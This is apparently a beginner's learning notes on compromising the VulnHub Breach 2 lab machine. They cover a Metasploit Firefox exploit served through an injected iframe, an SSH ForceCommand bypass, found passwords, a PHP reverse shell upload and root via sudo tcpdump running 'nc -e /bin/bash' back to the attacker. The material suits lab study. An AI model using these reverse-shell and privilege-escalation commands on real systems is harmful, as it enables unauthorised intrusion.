@@ -1,0 +1,332 @@
+i am learning this
+
+learned basic commands today by cheatsheet
+
+so practicing metasploit in this machine is really very informative for me
+When i started practice in vulnhub breach 2 machine i failed so many times. again and again 
+my exploit not working. obviously mistake is mine not metasploit's one.
+
+so i take my time in metasploit section
+
+i wait for very long time but user peter seems not using blog
+
+by the way while using exploit i register on blog with this ->
+
+<iframe src='http://<my_attacking_ip/shell:80'></iframe>
+
+OR
+
+<iframe src='http://<my_attacking_ip>'></iframe>
+
+use exploit/multi/browser/firefox_proto_crmfrequest
+
+set uripath /
+set srvport 80 or else
+set srvhost <attacking_ip>
+set lhost <attacking_ip>
+set payload firefox/shell_reverse_tcp
+set lhost <attacking_ip>
+set lport 1234 or any 
+run / exploit
+
+
+
+After waiting and correcting my mistake which i figured out finally session created :D
+
+==========================================================================================
+
+
+check session ---> sessions -l
+
+use session ---> sessions -i 1 or 2 or 3 etc
+
+g0tmilk blog will help now
+
+I now got to know that if session closed then use meterpreter --->
+use post/multi/manage/shell_to_meterpreter
+set session 1
+run
+
+============================
+
+session close so check why was session close -->
+
+cat /etc/ssh/sshd_config  
+====>
+         
+# Package generated configuration file
+# See the sshd_config(5) manpage for details
+
+# What ports, IPs and protocols we listen for
+Port 65535
+# Use these options to restrict which interfaces/protocols sshd will bind to
+#ListenAddress ::
+#ListenAddress 0.0.0.0
+Protocol 2
+# HostKeys for protocol version 2
+HostKey /etc/ssh/ssh_host_rsa_key
+HostKey /etc/ssh/ssh_host_dsa_key
+HostKey /etc/ssh/ssh_host_ecdsa_key
+HostKey /etc/ssh/ssh_host_ed25519_key
+#Privilege Separation is turned on for security
+UsePrivilegeSeparation yes
+
+# Lifetime and size of ephemeral version 1 server key
+KeyRegenerationInterval 3600
+ServerKeyBits 1024
+
+# Logging
+SyslogFacility AUTH
+LogLevel INFO
+
+# Authentication:
+LoginGraceTime 120
+PermitRootLogin no
+StrictModes yes
+
+RSAAuthentication yes
+PubkeyAuthentication yes
+#AuthorizedKeysFile	%h/.ssh/authorized_keys
+
+# Don't read the user's ~/.rhosts and ~/.shosts files
+IgnoreRhosts yes
+# For this to work you will also need host keys in /etc/ssh_known_hosts
+RhostsRSAAuthentication no
+# similar for protocol version 2
+HostbasedAuthentication no
+# Uncomment if you don't trust ~/.ssh/known_hosts for RhostsRSAAuthentication
+#IgnoreUserKnownHosts yes
+
+# To enable empty passwords, change to yes (NOT RECOMMENDED)
+PermitEmptyPasswords no
+
+# Change to yes to enable challenge-response passwords (beware issues with
+# some PAM modules and threads)
+ChallengeResponseAuthentication no
+
+# Change to no to disable tunnelled clear text passwords
+#PasswordAuthentication yes
+
+# Kerberos options
+#KerberosAuthentication no
+#KerberosGetAFSToken no
+#KerberosOrLocalPasswd yes
+#KerberosTicketCleanup yes
+
+# GSSAPI options
+#GSSAPIAuthentication no
+#GSSAPICleanupCredentials yes
+
+X11Forwarding yes
+X11DisplayOffset 10
+PrintMotd no
+PrintLastLog yes
+TCPKeepAlive yes
+#UseLogin no
+
+#MaxStartups 10:30:60
+Banner /etc/issue.net
+
+# Allow client to pass locale environment variables
+AcceptEnv LANG LC_*
+
+Subsystem sftp /usr/lib/openssh/sftp-server
+
+# Set this to 'yes' to enable PAM authentication, account processing,
+# and session processing. If this is enabled, PAM authentication will
+# be allowed through the ChallengeResponseAuthentication and
+# PasswordAuthentication.  Depending on your PAM configuration,
+# PAM authentication via ChallengeResponseAuthentication may bypass
+# the setting of "PermitRootLogin without-password".
+# If you just want the PAM account and session checks to run without
+# PAM authentication, then enable this but set PasswordAuthentication
+# and ChallengeResponseAuthentication to 'no'.
+UsePAM yes
+AllowUsers peter
+ForceCommand /usr/bin/startme
+AddressFamily inet
+you have mail
+====================================
+
+ForceCommand /usr/bin/startme  is interesting ----->
+
+cat /usr/bin/startme
+=====>
+#!/bin/bash
+
+sudo /etc/init.d/apache2 start &> /dev/null
+
+===========================================
+
+As peter is the only user to allow ssh so to bypass such protection use bash trick
+
+echo "exec sh" >> .bashrc
+
+then login using ssh peter@192.168.110.151 -p65535
+password -> inthesource
+
+
+
+=================
+check services -> netstat -tln
+
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:50236           0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN     
+tcp6       0      0 :::41604                :::*                    LISTEN     
+tcp6       0      0 :::111                  :::*                    LISTEN     
+tcp6       0      0 :::80                   :::*                    LISTEN
+
+mysql open on 3306 and in solution i see unknown service running  on this port 2323
+==============
+
+TIP: Always check all configuration files and take time to check all other directories too
+
+=================
+
+Check 2323 port ->
+grep -rl 2323 /etc 2>/dev/null
+
+output ->
+
+/etc/xinetd.d/initech
+/etc/services
+
+cat /etc/xinetd.d/initech --->
+
+==============================
+# default: on
+
+service initech
+
+{ 
+
+disable = no
+flags = REUSE
+socket_type = stream
+wait = no
+user = root
+server = /usr/sbin/in.telnetd
+log_on_failure += USERID
+bind = 127.0.0.1
+only_from = 127.0.0.1 
+port = 2323
+banner = /etc/motd
+}
+bind = 127.0.0.1
+only_from = 127.0.0.1
+port = 2424
+====================================
+
+telnetd <--- telnet service running on 2323
+
+29 45'46" N 95 22'59" W  <--- got this using telnet then google it -> city of Houston
+
+
+Peter,milton,blumbergh users and password can try Houston
+
+milton and password Houston worked
+
+Whose stapler is it?  don't know
+
+check solution ---> grep -rl stapler / 2/dev/null
+
+Interesting -> /usr/local/bin/cd.py
+=============
+#!/usr/bin/python
+
+import signal
+import time
+import os
+
+s = signal.signal(signal.SIGINT, signal.SIG_IGN)
+
+countdown=3
+
+while countdown >0:
+	time.sleep(1)
+	print(countdown)
+	countdown -=1
+if countdown <1:
+	question = raw_input("Whose stapler is it?")
+if question == "mine":
+	os.system("echo 'Woot!'")
+else:
+
+	os.system("kill -9 %d"%(os.getppid()))
+	signal.signal(signal.SIGINT, s)
+you have mail
+=================
+
+mine <---- enter this and we in :D
+=============
+
+So here is TIP i learn so far -> always check services first ---> netstat -tulpn
+
+checking /home/milton/.profile i saw nginx
+
+by checking -> http://192.168.110.151:8888/oscommerce/
+
+SERVICE ---> v3.0 Alpha 5
+using searchsploit oscommerce i got to know that this version is -> V3.0a5
+
+Local File Inclusion / HTML Injection <--- exploit
+
+cat 33913.html
+
+--->
+i struggled this part so i use google to find the way to shell access then i got many results and then i learned it
+
+So i use first 
+mysql -u root
+
+show databases;
+
+use oscommerce;
+
+show tables;
+
+select * from osc_administrators;
+
+wow  i learned few sql commands :D
+
+Then i got credintials which i already got using sqlmap
+
+admin:32admin
+
+i entered with those login details and take my time  to check all links as i learned from tutorial that i must check for uploading file then i saw file-manager and there work directory i uploaded reverse shell
+
+/usr/share/webshells/php/php-reverse-shell.php  
+
+i change ip to my attacking machine 
+
+then run 
+
+nc -lvvp 1234
+
+and when i open the shell site i got the shell access
+
+sudo -l to check is user able to use sudo mean permission to run important things
+
+/usr/sbin/tcpdump    <--- i got this
+
+How to use this. i check solution and found the link ---->
+
+https://www/securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/
+
+wow what a great link. Must to check and learn :V
+
+echo "/bin/nc -nv 192.168.110.1 444 -e /bin/bash" > .test
+
+then
+
+sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+
+Though i don't know whats those but i will research about them later.
+
+
+THEN ---> nc -lvvp 444  and BOOM got root id
